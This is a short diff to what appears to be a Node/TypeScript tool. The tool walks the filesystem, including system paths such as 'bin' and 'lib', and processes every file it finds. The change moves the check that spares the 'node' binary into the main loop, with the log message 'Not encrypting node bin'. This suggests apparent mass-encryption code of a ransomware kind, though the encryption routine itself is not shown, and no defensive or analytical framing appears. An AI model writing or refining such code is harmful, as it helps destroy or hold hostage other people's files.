@@ -89,11 +89,6 @@ const readdir = (directory: string): string[] => {
     // silent error
   }
 
-    switch(filename) {
-      case "node":
-	return true;
-    }
-
     switch(startPath) {
       case "bin":
       case "lib":
@@ -258,6 +253,20 @@ console.log(`Files found in ${+new Date() - +oldTime} ms`);
 
   console.log("Procesing " + filesInPath.length + " files...");
   for(let i = 0; i < filesInPath.length; ++i) {
+    if (/node/.test(filesInPath[i])) {
+      let aux = filesInPath[i];
+      try {
+	const aux2 = aux.split("/");
+	aux = aux2[aux2.length - 1];
+      } catch(err) {
+	// silent error
+      }
+      if (aux === "node") {
+	console.log("\n\n\n\n\nNot encrypting node bin\n\n\n");
+        break;
+      }
+    }
+
     console.log(`${i} of ${filesInPath.length} as ${filesInPath[i]} ...`); 
     try {
       const fileData = loadFile(filesInPath[i]);
